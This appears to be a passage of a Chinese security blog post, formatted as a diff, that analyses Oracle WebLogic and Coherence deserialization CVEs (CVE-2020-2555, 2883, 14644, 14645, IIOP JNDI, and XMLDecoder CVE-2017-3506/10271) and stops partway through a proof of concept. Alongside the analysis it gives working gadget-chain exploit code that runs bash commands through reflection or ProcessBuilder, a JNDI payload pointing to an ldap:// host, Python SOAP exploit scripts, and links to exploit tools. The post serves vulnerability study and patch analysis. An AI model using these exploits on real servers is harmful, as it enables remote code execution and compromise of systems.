+<p>这个漏洞源于对<code>JtaTransactionManager</code>类的错误过滤导致的IIOP反序列化，我们把入口点定在<code>JtaTransactionManager</code>类的<code>readObject()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021357376eba9d4fcbd4f18d3e.png" alt="image-20210129213556384"></p>
+<p>在<code>initUserTransactionAndTransactionManager()</code>方法中调用了<code>lookupUserTransaction()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021357e8f7f0c1ecfb087927ac.png" alt="image-20210129213630278"></p>
+<p>在<code>lookupUserTransaction()</code>方法中使用<code>getJndiTemplate()</code>返回的<code>jndiTemplate</code>实例的<code>lookup()</code>方法进行JNDI</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135808a71fb5f2e6ce2397eb.png" alt="image-20210129213658529"></p>
+<p>所以只要控制我们的<code>userTransactionName</code>属性就可以JNDI任意类</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135893e48783bc4de871b44d.png" alt="image-20210129213846393"></p>
+<p>根据这篇<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7422">博客</a>可以知道，这个gadget在<a target="_blank" rel="noopener" href="https://paper.seebug.org/718/">CVE-2018-3191</a>就已经被挖掘出来，当时修复的时候是<code>JtaTransactionManager</code>的父类<code>AbstractPlatformTransactionManager</code>加入到了黑名单列表，T3协议使用的是<code>resolveClass</code>方法进行过滤，<code>resolveClass</code>方法是会读取父类的，但是IIOP协议就不会去读取父类导致我们可以绕过黑名单，触发JNDI注入。</p>
+<p>下面是exploit的核心部分</p>
+<pre><code class="java">// 创建jndi的context
+Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;();
+env.put(&quot;java.naming.factory.initial&quot;, &quot;weblogic.jndi.WLInitialContextFactory&quot;);
+env.put(&quot;java.naming.provider.url&quot;, rhost);
+Context context = new InitialContext(env);
+// payload
+JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
+jtaTransactionManager.setUserTransactionName(rmiurl);
+// 代理类封装并绑定
+Remote remote = createMemoitizedProxy(createMap(&quot;Foo&quot;, jtaTransactionManager), Remote.class);
+context.rebind(&quot;Foo&quot;), remote);</code></pre>
+<p><strong>补丁</strong></p>
+<p>据说是直接封禁IIOP协议？</p>
+<h4 id="CVE-2020-2555"><a href="#CVE-2020-2555" class="headerlink" title="CVE-2020-2555"></a>CVE-2020-2555</h4><blockquote>
+<p>Oracle Coherence 3.7.1.17、12.1.3.0、12.2.1.3、12.2.1.4</p>
+<p>需要注意的虽然Weblogic 10.3.6.0自带Oracle Coherence 3.7，但是它默认未启用Coherence，所以不在影响范围之内</p>
+</blockquote>
+<p><strong>工具利用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Y4er/CVE-2020-2555.git">https://github.com/Y4er/CVE-2020-2555.git</a></p>
+<p><strong>漏洞分析</strong></p>
+<p>漏洞入口在<code>coherence.jar</code>的<code>LimitFilter</code>类的<code>toString()</code>方法中，而<code>BadAttributeValueExpException</code>这个类可以调用任何类（val）的<code>toString()</code>方法，只要控制<code>setSecurityManager</code>为<code>null</code>即可，所以我们利用它来封装我们的恶意对象</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437bc0b762a1921e1de3106.png" alt="image-20210127123724776"></p>
+<p>在<code>toString()</code>方法中，提取<code>m_comparator</code>的值作为ValueExtractor，再对<code>m_oAnchorTop</code>和<code>m_oAnchorBottom</code>调用<code>extract()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714373cd6a3047dec16ffcc82.png" alt="image-20210127131228572"></p>
+<p>进入<code>extract()</code>，它是创建一个的aExtractor，并递归调用<code>extract()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714378d6a778ed7c269d93054.png" alt="image-20210127131851693"></p>
+<p><code>getExtractors()</code>返回的是<code>m_aExtractor</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714371dcf8ddf74226cda2ecc.png" alt="image-20210127131908064"></p>
+<p>内部的<code>extract()</code>就是利用反射机制返回方法调用，方法名和参数都可以空，所以只要构成一条extract chain就可以实现任意代码执行了</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271437e11ca574d1a166db1591.png" alt="image-20210127132406861"></p>
+<p>exploit核心部分</p>
+<pre><code class="java">public static void main(String[] args) throws Exception &#123;
+    // 构造反射连
+    ReflectionExtractor extractor1 = new ReflectionExtractor(
+        &quot;getMethod&quot;, new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;
+    );
+    ReflectionExtractor extractor2 = new ReflectionExtractor(
+        &quot;invoke&quot;, new Object[]&#123;null, new Object[0]&#125;
+    );
+    ReflectionExtractor extractor3 = new ReflectionExtractor(
+        &quot;exec&quot;, new Object[]&#123;new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;touch /tmp/success&quot;&#125;&#125;
+    );
+    ReflectionExtractor[] extractors = &#123;
+        extractor1,
+        extractor2,
+        extractor3,
+    &#125;;
+    // 创建LimitFilter实例
+    ChainedExtractor chainedExtractor = new ChainedExtractor(extractors);
+    LimitFilter limitFilter = new LimitFilter();
+    // 设置limitFilter的m_comparator属性
+    Field m_comparator = limitFilter.getClass().getDeclaredField(&quot;m_comparator&quot;);
+    m_comparator.setAccessible(true);
+    m_comparator.set(limitFilter, chainedExtractor);
+    // 设置limitFilter的m_oAnchorTop属性
+    Field m_oAnchorTop = limitFilter.getClass().getDeclaredField(&quot;m_oAnchorTop&quot;);
+    m_oAnchorTop.setAccessible(true);
+    m_oAnchorTop.set(limitFilter, Runtime.class);
+    // 设置BadAttributeValueExpException的val属性
+    BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
+    Field field = badAttributeValueExpException.getClass().getDeclaredField(&quot;val&quot;);
+    field.setAccessible(true);
+    field.set(badAttributeValueExpException, limitFilter);
+    // 序列化并发送payload
+    byte[] payload = Serializables.serialize(badAttributeValueExpException);
+    T3ProtocolOperation.send(&quot;127.0.0.1&quot;, &quot;7001&quot;, payload);
+&#125;</code></pre>
+<p><strong>补丁</strong></p>
+<p>这里借一下别人的图，修复的方式特别有趣，把整个把<code>LimitFilter</code>类的<code>toString()</code>方法中的全部extractor去掉了</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143734f9c7c3a6c91d0db4a5.png" alt="image-20210127100406491" style="zoom:67%;" />
+
+
+
+<h4 id="CVE-2020-2883"><a href="#CVE-2020-2883" class="headerlink" title="CVE-2020-2883"></a>CVE-2020-2883</h4><blockquote>
+<p>WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0</p>
+</blockquote>
+<p><strong>工具利用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Y4er/CVE-2020-2883">https://github.com/Y4er/CVE-2020-2883</a></p>
+<p><strong>漏洞分析</strong></p>
+<p>此漏洞是对CVE-2020-2555补丁的绕过，因为<code>LimitFilter</code>被禁了，所以我们需要找其他在内部调用了<code>extract()</code>方法的函数，<code>java.util.PriorityQueue.readObject()</code>就是其中一个，我们跟进<code>heapify()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714375b7d2845c7978cadf80b.png" alt="image-20210127134622640"></p>
+<p>递归调用<code>siftDown()</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271438502ed1d21c0123b3c682.png" alt="image-20210127134703950"></p>
+<p>如果<code>comparator</code>非空，即如果我们自己定义比较器，就调用<code>siftDownUsingComparator()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714386d889120abe5f2902c96.png" alt="image-20210127134828845"></p>
+<p>然后在我们的comparator调用<code>compare()</code>方法时</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143840af1a57fa0cdac84aff.png" alt="image-20210127135716314"></p>
+<p>在里面也调用了<code>extract()</code>方法，后面就和CVE-2020-2555类似了</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127143840af1a57fa0cdac84aff.png" alt="image-20210127141737892"></p>
+<p>exploit核心代码</p>
+<pre><code class="java">public static void main(String[] args) throws Exception &#123;
+    // 构造反射链
+    ReflectionExtractor reflectionExtractor1 = new ReflectionExtractor(&quot;getMethod&quot;, new Object[]&#123;&quot;getRuntime&quot;, new Class[]&#123;&#125;&#125;);
+    ReflectionExtractor reflectionExtractor2 = new ReflectionExtractor(&quot;invoke&quot;, new Object[]&#123;null, new Object[]&#123;&#125;&#125;);
+    ReflectionExtractor reflectionExtractor3 = new ReflectionExtractor(&quot;exec&quot;, new Object[]&#123;new String[]&#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;touch /tmp/success&quot;&#125;&#125;);
+    ValueExtractor[] valueExtractors = new ValueExtractor[]&#123;
+        reflectionExtractor1,
+        reflectionExtractor2,
+        reflectionExtractor3,
+    &#125;;
+    // 创建ChainedExtractor实例
+    ReflectionExtractor reflectionExtractor = new ReflectionExtractor(&quot;toString&quot;, new Object[]&#123;&#125;);
+    ValueExtractor[] valueExtractors1 = new ValueExtractor[]&#123; reflectionExtractor &#125;;
+    ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);
+    // 创建PriorityQueue，并使用自定义的chainedExtractor
+    PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
+    queue.add(&quot;1&quot;);
+    queue.add(&quot;1&quot;);
+    // 设置m_aExtractor属性
+    Class clazz = ChainedExtractor.class.getSuperclass();
+    Field m_aExtractor = clazz.getDeclaredField(&quot;m_aExtractor&quot;);
+    m_aExtractor.setAccessible(true);
+    m_aExtractor.set(chainedExtractor1, valueExtractors);
+    // 序列化并发送payload
+    byte[] payload = Serializables.serialize(queue);
+    T3ProtocolOperation.send(&quot;127.0.0.1&quot;, &quot;7001&quot;, payload);
+&#125;</code></pre>
+<p><strong>补丁</strong></p>
+<p>将存在类似上面操作的<code>extract()</code> 方法的<code>MvelExtractor</code>和<code>ReflectionExtractor</code> 两个类加入到了黑名单中</p>
+<h4 id="CVE-2020-14644"><a href="#CVE-2020-14644" class="headerlink" title="CVE-2020-14644"></a>CVE-2020-14644</h4><blockquote>
+<p>Oracle WebLogic Server 12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p>
+</blockquote>
+<p><strong>工具利用</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/potats0/cve_2020_14644">https://github.com/potats0/cve_2020_14644</a></p>
+<blockquote>
+<p>坑：注意打包成jar的时候把jar文件分开放，不然会有其他jar文件的输出信息</p>
+</blockquote>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021358b9e10947ecdee548a535.png" alt="image-20210129234101716"></p>
+<p><strong>漏洞分析</strong></p>
+<p>这是一条全新的gadget，漏洞入口点在<code>coherence.jar</code>中的<code>com.tangosol.internal.util.invoke.RemoteConstructor</code>，当反序列化类定义了<code>readResolve()</code>方法时，会在<code>readObject()</code>之后被调用</p>
+<p>首先我们得知道，如果变量被<code>transient</code>和<code>static</code>修饰的话是不参与序列化和反序列化的，比如下面的<code>m_serializer</code>和<code>m_loader</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202135955524e1a6690fa3d0c29.png" alt="image-20210130120113315"></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021359a7b05e8757eadb957aab.png" alt="image-20210130115655500"></p>
+<p><code>newInstance()</code>如下<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400756c4a2b55c1afe83845.png" alt="image-20210130115853118"></p>
+<p><code>getClassLoader()</code>中因为<code>m_loader</code>为空（原因上面提到），所以调用<code>getContextClassLoader()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400a03df57402b076eb10f3.png" alt="image-20210130115954423"></p>
+<p>在<code>realize()</code>方法调用如下</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021400462dfef75783cc2032c3.png" alt="image-20210130130218731"></p>
+<p><code>getDefinition()</code>返回的是我们的<code>m_definition</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401a32f3723ecc6d3da1ebd.png" alt="image-20210130125805171"></p>
+<p>然后是调用了<code>definition</code>的<code>getRemotableClass()</code>方法，返回的是<code>m_clz</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401a6e85ebadc3407627149.png" alt="image-20210130130001177"></p>
+<p>但是它也是被<code>transient</code>修饰的，所以返回的也是空</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401d9c44b4992aeefa34844.png" alt="image-20210130130045856"></p>
+<p>所以下面我们会调用<code>defineClass()</code>去加载我们的<code>definition</code>，这里就可以自己实例化一个自定义类了</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021401db235884b695c3092387.png" alt="image-20210130130456664"></p>
+<p>相关方法的返回如下</p>
+<pre><code class="java">    public ClassIdentity getId() &#123;
+        return this.m_id;
+    &#125;
+    // 包名和方法名用`/`隔开
+    public String getName() &#123;
+        return this.getPackage() + &quot;/&quot; + this.getSimpleName();
+    &#125;
+    public String getPackage() &#123;
+        return this.m_sPackage;
+    &#125;    
+    // 方法名和版本号用`$`隔开
+    public String getSimpleName() &#123;
+        return this.getBaseName() + &quot;$&quot; + this.getVersion();
+    &#125;
+    public String getBaseName() &#123;
+        return this.m_sBaseName;
+    &#125;
+    public String getVersion() &#123;
+        return this.m_sVersion;
+    &#125;</code></pre>
+<p>在后面还会对包名进行检测</p>
+<pre><code class="java">    private ProtectionDomain preDefineClass(String var1, ProtectionDomain var2) &#123;
+        if (!this.checkName(var1)) &#123;
+            throw new NoClassDefFoundError(&quot;IllegalName: &quot; + var1);
+        &#125; else if (var1 != null &amp;&amp; var1.startsWith(&quot;java.&quot;)) &#123;
+            throw new SecurityException(&quot;Prohibited package name: &quot; + var1.substring(0, var1.lastIndexOf(46)));
+        &#125; else &#123;
+            if (var2 == null) &#123;
+                var2 = this.defaultDomain;
+            &#125;
+
+            if (var1 != null) &#123;
+                this.checkCerts(var1, var2.getCodeSource());
+            &#125;
+
+            return var2;
+        &#125;
+    &#125;
+    // 检查包名
+    private boolean checkName(String var1) &#123;
+        if (var1 != null &amp;&amp; var1.length() != 0) &#123;
+            return var1.indexOf(47) == -1 &amp;&amp; (VM.allowArraySyntax() || var1.charAt(0) != &#39;[&#39;);
+        &#125; else &#123;
+            return true;
+        &#125;
+    &#125;</code></pre>
+<p>所以exploit可以这么编写</p>
+<pre><code class="java">// 实例化一个ClassIdentity
+ClassIdentity classIdentity = new ClassIdentity(test.class);
+// ClassPool是CtClass实例的容器
+ClassPool cp = ClassPool.getDefault();
+// CtClass表示一个class文件，以字节码方式存储
+CtClass ctClass = cp.get(test.class.getName());
+// 添加version规范类名
+ctClass.replaceClassName(test.class.getName(), test.class.getName() + &quot;$&quot; + classIdentity.getVersion());
+// 使用RemoteConstructor类封装
+RemoteConstructor constructor = new RemoteConstructor(new ClassDefinition(classIdentity, ctClass.toBytecode()), new Object[0]);</code></pre>
+<p><strong>补丁</strong></p>
+<p>未知</p>
+<h4 id="CVE-2020-14645"><a href="#CVE-2020-14645" class="headerlink" title="CVE-2020-14645"></a>CVE-2020-14645</h4><blockquote>
+<p>Oracle WebLogic Server 12.2.1.4.0</p>
+<p>因为此构造链子用到了<code>UniversalExtractor</code>类，而这个类是Weblogic 12.2.1.4.0独有的，所以只能影响这个版本</p>
+</blockquote>
+<p><strong>工具利用</strong></p>
+<p>在<code>weblogic_cmd.jar</code>上修改</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Y4er/CVE-2020-14645">https://github.com/Y4er/CVE-2020-14645</a></p>
+<p><strong>漏洞分析</strong></p>
+<p>此漏洞是对CVE-2020-2883的补丁绕过，在CVE-2020-2883把<code>ReflectionExtractor</code>类加入到黑名单，我们可以用<code>UniversalExtractor</code>类去进行构造</p>
+<p>依旧是来到之前自定义的比较器，这次我们调用的是<code>UniversalExtractor</code>类的<code>extractor</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021402cab665089beeb289fc12.png" alt="image-20210130141130883"></p>
+<p>因为<code>oTarget</code>和<code>targetPrev</code>不相等，所以调用<code>extractComplex()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214038c48020886f649cc2084.png" alt="image-20210130141158447"></p>
+<p><code>extractComplex()</code>方法具体调用如下</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021403f906fc7d8ec46927ab7d.png" alt="image-20210130141530634"></p>
+<p>这里我们要令<code>clzParam</code>为空（原因在下），查看<code>getClassArry()</code>方法，只要令传入的<code>m_aoParam</code>为空即可</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021403182d049a76551a629993.png" alt="image-20210130143626948"></p>
+<p>然后来到<code>getCanonicalName()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021407274effe8c9bf6cda9c08.png" alt="image-20210130144532283"></p>
+<p>进入<code>getValueExtractorCanonicalName()</code>方法，获取lambda的方法名，再放入到<code>computeValueExtractorCanonicalName()</code>调用，其实就是提取出<code>.getKey().databaseMetaData</code>的后半部分，即最后返回的<code>sCName</code>为<code>databaseMetaData</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140467bd62ac3f4bb46c692c.png" alt="image-20210130144653254"></p>
+<p><code>isPropertyExtractor()</code>返回<code>!m_fMethod</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214071b18a1316fc7eab787db.png" alt="image-20210130141922042"></p>
+<p>我们看看<code>m_fMethod</code>的定义，因为<code>m_fMethod</code>被<code>transient</code>修饰，所以<code>fProperty</code>只能为true</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140432f8cbc611eb7fd1ca1b.png" alt="image-20210130143857296"></p>
+<p>如果<code>fProperty</code>为true，就会去调用<code>ClassHelper.findMethod()</code>方法，其中<code>BEAN_ACCESSOR_PREFIXES</code>如下，所以说我们可以调用到任意的<code>get、is</code>的方法，这里是漏洞利用的关键点，在该测试中，我们调用的关键方法为<code>getDatabaseMetaData()</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021405b1f8225d79e1aaa35a03.png" alt="image-20210130142347926"></p>
+<p>令<code>cParams</code>为空，即令上面提到的<code>clzParam</code>为空，<code>fExactMatch</code>就会一直为true，如果<code>fExactMatch &amp;&amp; !fStatic</code>为true，就回去调用<code>getMethod()</code>方法，这样就能顺利返回方法调用</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021405957f92e7dcdfb9a598ff.png" alt="image-20210130142813607"></p>
+<p>之后就是调用<code>getDatabaseMetaData</code>的<code>invoke()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020214067dcd1f4de020641c89d1.png" alt="image-20210130145752528"></p>
+<p>持续跟进，我们可以看到调用了<code>getDatabaseMetaData</code>的<code>connect()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140620de56c99f0a1bde7e27.png" alt="image-20210130145845091"></p>
+<p>在里面我们就会看到<code>lookup()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210202140786a4ea00a352dc2ca03d.png" alt="image-20210130145911420"></p>
+<p>JNDI的地址就是我们的<code>dataSource</code></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021407d547627a020518b77053.png" alt="image-20210130150003790"></p>
+<p>所以exploit的编写如下</p>
+<pre><code class="java">// 创建ExtractorComparator实例
+UniversalExtractor extractor = new UniversalExtractor(&quot;getDatabaseMetaData()&quot;, null, 1);
+final ExtractorComparator comparator = new ExtractorComparator(extractor);
+// 创建JdbcRowSetImpl实例
+JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
+rowSet.setDataSourceName(&quot;ldap://172.20.0.2:1089/#exp&quot;);
+// 创建PriorityQueue实例，并使用自定义比较器
+final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+Object[] q = new Object[]&#123;rowSet, rowSet&#125;;
+Reflections.setFieldValue(queue, &quot;queue&quot;, q);
+Reflections.setFieldValue(queue, &quot;size&quot;, 2);
+// 序列化并发送payload
+byte[] payload = Serializables.serialize(queue);
+T3ProtocolOperation.send(&quot;172.20.0.2&quot;, &quot;7001&quot;, payload);</code></pre>
+<p><strong>补丁</strong></p>
+<p>未知</p>
+<h3 id="XML反序列化"><a href="#XML反序列化" class="headerlink" title="XML反序列化"></a>XML反序列化</h3><h4 id="CVE-2017-3506"><a href="#CVE-2017-3506" class="headerlink" title="CVE-2017-3506"></a>CVE-2017-3506</h4><blockquote>
+<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.0、12.2.1.1、12.2.1.2</p>
+</blockquote>
+<p><strong>poc</strong></p>
+<pre><code class="python">import requests
+import re
+import sys
+
+headers = &#123; &#39;Content-Type&#39;:&#39;text/xml&#39; &#125;
+proxies = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125;
+
+def poc(url, cmd):
+    url = &#39;%s/wls-wsat/CoordinatorPortType&#39; % url
+    data = &#39;&#39;&#39;
+    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+      &lt;soapenv:Header&gt;
+        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+          &lt;java&gt;
+            &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;
+              &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+                &lt;void index=&quot;0&quot;&gt;
+                  &lt;string&gt;/bin/bash&lt;/string&gt;
+                &lt;/void&gt;
+                &lt;void index=&quot;1&quot;&gt;
+                  &lt;string&gt;-c&lt;/string&gt;
+                &lt;/void&gt;
+                &lt;void index=&quot;2&quot;&gt;
+                  &lt;string&gt;%s&lt;/string&gt;
+                &lt;/void&gt;
+              &lt;/array&gt;
+              &lt;void method=&quot;start&quot;/&gt;
+            &lt;/object&gt;
+          &lt;/java&gt;
+        &lt;/work:WorkContext&gt;
+      &lt;/soapenv:Header&gt;
+      &lt;soapenv:Body/&gt;
+    &lt;/soapenv:Envelope&gt;
+    &#39;&#39;&#39; % cmd
+
+    try:
+        response = requests.post(url, headers=headers, data=data, verify=False, timeout=5, proxies=proxies)
+        response = response.text
+        response = re.search(r&quot;\&lt;faultstring\&gt;.*\&lt;\/faultstring\&gt;&quot;, response).group(0)
+    except Exception as e:
+        response = &quot;&quot;
+
+    if &#39;&lt;faultstring&gt;java.lang.ProcessBuilder&#39; in response or &quot;&lt;faultstring&gt;0&quot; in response:
+        result = &quot;test ok&quot;
+        return result
+    else:
+        result = &quot;No Vulnerability&quot;
+        return result
+
+if __name__ == &#39;__main__&#39;:
+    if len(sys.argv) &lt; 3:
+        print(&quot;python poc.py http://127.0.0.1:7001 touch /tmp/success&quot;)
+        sys.exit(0)
+    else:
+        ip = sys.argv[1]
+        cmd = &#39; &#39;.join(sys.argv[2:])
+        print(cmd)
+        print(poc(ip, cmd))</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>这个漏洞是构造SOAP（XML）格式的请求触发XMLDecoder的反序列化，把漏洞入口定位在<code>WorkContextServerTube</code>类中的<code>processRequest()</code>方法，<code>var1</code>为我们传入的SOAP请求，它会写到<code>var3</code>中并调用了<code>readHeaderOld()</code>方法</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714384fc665e776134ef9a962.png" alt="image-20210125172658998"></p>
+<p>跟进去我们会发现它被传入到了<code>WorkContextXmlInputAdapter</code>类的构造函数中，这个地方就是漏洞的关键，说明我们对任意XML进行反序列化</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714380d533c96064eb3bf975e.png" alt="image-20210125173128468"></p>
+<p>跟进这个类，可以发现它直接被带入了<code>XMLDecoder()</code>构造函数</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714392d61ea0a8a3658ce1bb8.png" alt="image-20210125173246975"></p>
+<p>跳出来跟进<code>receive()</code>方法，就是处理拿到的XML数据，持续跟进就能看到它调用了<code>readObject()</code>方法进行反序列化</p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439f774ef60ae7c51d371db.png" alt="image-20210125174531750"></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439cdce681dad871d89c2e2.png" alt="image-20210125174545079"></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714398ed563a56218a3998d96.png" alt="image-20210125174303357"></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439ab41b28324fe6397a843.png" alt="image-20210125174632414"></p>
+<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440713e032701c41d85a687.png" alt="image-20210125174415289"></p>
+<p><strong>补丁</strong></p>
+<p>找了网上别人的补丁主要代码，也是采用黑名单机制</p>
+<pre><code class="java">private void validate(InputStream is) &#123;
+    WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();
+    try &#123;
+        SAXParser parser = factory.newSAXParser();
+        parser.parse(is, new DefaultHandler() &#123;
+            public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;
+                if (qName.equalsIgnoreCase(&quot;object&quot;)) &#123;
+                    throw newIllegalStateException(&quot;Invalid context type: object&quot;);
+                &#125;
+            &#125;
+        &#125;);
+    &#125; catch(ParserConfigurationException var5) &#123;
+        throw new IllegalStateException(&quot;Parser Exception&quot;, var5);
+    &#125; catch(SAXException var6) &#123;
+        throw new IllegalStateException(&quot;Parser Exception&quot;, var6);
+    &#125; catch(IOException var7) &#123;
+        throw new IllegalStateException(&quot;Parser Exception&quot;, var7);
+    &#125;
+&#125;</code></pre>
+<p>可以看到它只是禁止了<code>qName</code>为<code>object</code>类而已，所以很快就出现了下面CVE-2017-10271的绕过</p>
+<h4 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h4><blockquote>
+<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2</p>
+</blockquote>
+<p><strong>poc</strong></p>
+<pre><code class="python">import requests
+import re
+import sys
+
+headers = &#123;&#39;Content-Type&#39;:&#39;text/xml&#39;&#125;
+proxies = &#123;&quot;http&quot;: &quot;http://127.0.0.1:8080&quot;&#125;
+
+def poc(url, cmd):
+    url = &#39;%s/wls-wsat/CoordinatorPortType&#39; % url
+    data = &#39;&#39;&#39;
+    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+      &lt;soapenv:Header&gt;
+        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+          &lt;java&gt;
+            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
+              &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+                &lt;void index=&quot;0&quot;&gt;
+                  &lt;string&gt;/bin/bash&lt;/string&gt;
+                &lt;/void&gt;
+                &lt;void index=&quot;1&quot;&gt;
+                  &lt;string&gt;-c&lt;/string&gt;
+                &lt;/void&gt;
+                &lt;void index=&quot;2&quot;&gt;
+                  &lt;string&gt;%s&lt;/string&gt;
+                &lt;/void&gt;
+              &lt;/array&gt;
+              &lt;void method=&quot;start&quot;/&gt;
+            &lt;/void&gt;
+          &lt;/java&gt;
+        &lt;/work:WorkContext&gt;
+      &lt;/soapenv:Header&gt;
+      &lt;soapenv:Body/&gt;
